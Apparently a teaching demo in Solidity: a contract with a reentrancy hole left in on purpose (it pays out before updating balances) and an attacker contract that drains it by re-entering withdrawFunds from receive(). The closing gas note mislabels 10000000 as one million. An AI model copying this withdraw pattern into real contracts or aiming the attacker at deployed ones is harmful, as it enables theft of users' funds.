// SPDX-License-Identifier: MIT
pragma solidity 0.8.28;

contract Victam {
    mapping(address => uint256) public depositedFunds;

    event fundsDeposited(address indexed sender, uint256 indexed amount);
    event fundsWithdrawn(address indexed receiver, uint256 indexed amount);

    function withdrawFunds() public {
        uint256 callerAmount = depositedFunds[msg.sender];

        (bool success, ) = payable(msg.sender).call{value: callerAmount}("");
        // do not put check here , otherwise it will fail

        if (depositedFunds[msg.sender] >= callerAmount) {
            depositedFunds[msg.sender] -= callerAmount;
        } else {
            depositedFunds[msg.sender] = 0;
        }

        emit fundsWithdrawn(msg.sender, callerAmount);
    }

    function depositFunds() public payable {
        depositedFunds[msg.sender] += msg.value;
        emit fundsDeposited(msg.sender, msg.value);
    }
}

contract Attacker {
    Victam victam;

    constructor(Victam _victamAddress) {
        victam = _victamAddress;
    }

    function depositToVictam() public payable {
        victam.depositFunds{value: msg.value}();
    }

    function attack() public {
        victam.withdrawFunds();
    }

    receive() external payable {
        if (address(victam).balance >= 0 ether) {
            victam.withdrawFunds();
        }
    }
}

//  If the all funds are not withdrawn then increase the gas limit in to custom 10000000 (1 Million)
